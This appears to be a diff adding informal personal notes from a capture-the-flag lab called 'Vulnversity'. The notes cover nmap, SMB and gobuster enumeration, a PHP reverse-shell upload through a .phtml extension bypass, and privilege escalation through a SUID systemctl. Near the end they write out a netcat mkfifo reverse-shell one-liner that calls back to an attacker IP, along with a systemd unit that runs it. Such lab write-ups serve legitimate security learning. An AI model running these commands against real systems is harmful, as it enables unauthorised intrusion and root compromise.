@@ -1,0 +1,156 @@
+10.10.188.230
+
+smbclient //   GTFO 
+
+NMAP
+
+nmap -sC -sS -sV -T4 -O -n -Pn 10.10.188.230 -oN nmap1     
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 10:45 EST
+Nmap scan report for 10.10.188.230
+Host is up (0.100s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/19%OT=21%CT=1%CU=35809%PV=Y%DS=2%DC=I%G=Y%TM=602FDD6
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=105%GCD=1%ISR=10A%TI=Z%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
+OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 1s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2021-02-19T10:46:41-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-19T15:46:41
+|_  start_date: N/A
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.44 seconds
+
+
+could not resist to do next,,,
+
+
+smbclient -L 10.10.188.230                                              255 ⨯
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (vulnuniversity server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+gobuster as directed,,,
+
+gobuster dir -u http://10.10.188.230:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.188.230:3333
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/19 10:52:41 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/internal (Status: 301)
+Progress: 4859 / 220561 (2.20%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2021/02/19 10:53:40 Finished
+===============================================================
+
+the server will block php extensions,,, 
+
+we go to burbsuite to do a sniper attack,,, 
+
+burpsuite didn't really work that well, so went to zap,,  fuzzed it with same list and the phtml extension has less bytes ,,
+
+downloaded pentestmonkey reverse, and prepped it,,
+
+uploaded file, and executed it on internal/uploads/reverse.phtml
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cd home
+$ dir
+bill
+$ cd bill
+$ ls
+user.txt
+$ cat user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+
+went to writeups for command to search the SUID stuff, and try to understand this better,,, 
+https://sckull.github.io/posts/vulnversity/
+
+first thing I see is that didn't run gobuster second time to further enumerate site, 
+
+command I was looking for:
+find / -perm -4000 2> /dev/null | xargs ls -lah
+
+
+remember to start nc @ 1337
+
+two separate paste::
+1-
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.45 1337 >/tmp/f" > /tmp/shell.sh
+
+2-
+TF=$(mktemp).service
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "bash /tmp/shell.sh"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+
